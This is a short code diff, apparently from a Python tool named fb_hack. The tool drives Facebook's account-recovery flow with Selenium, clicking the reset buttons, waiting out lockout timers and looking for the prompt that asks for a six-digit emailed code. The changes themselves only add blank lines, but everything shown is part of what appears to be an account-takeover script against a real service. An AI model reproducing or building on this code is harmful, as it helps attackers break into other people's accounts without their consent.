@@ -70,6 +70,7 @@ def fb_hack(email, codex):
     t = 86400
     countdown(t)
     return past
+
   try:
     search_button = driver.find_element(by = By.NAME, value = "tryanotherway")
     search_button.click()
@@ -83,6 +84,7 @@ def fb_hack(email, codex):
     countdown(t)
     driver.close()
     return past
+
   try:
     search_button = driver.find_element(by = By.NAME, value = "reset_action")
     search_button.click()
@@ -96,6 +98,7 @@ def fb_hack(email, codex):
     past = codex
     driver.close()
     return past
+
   counter = 0
   test = soup.find(string="pop")
   sixdigits = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
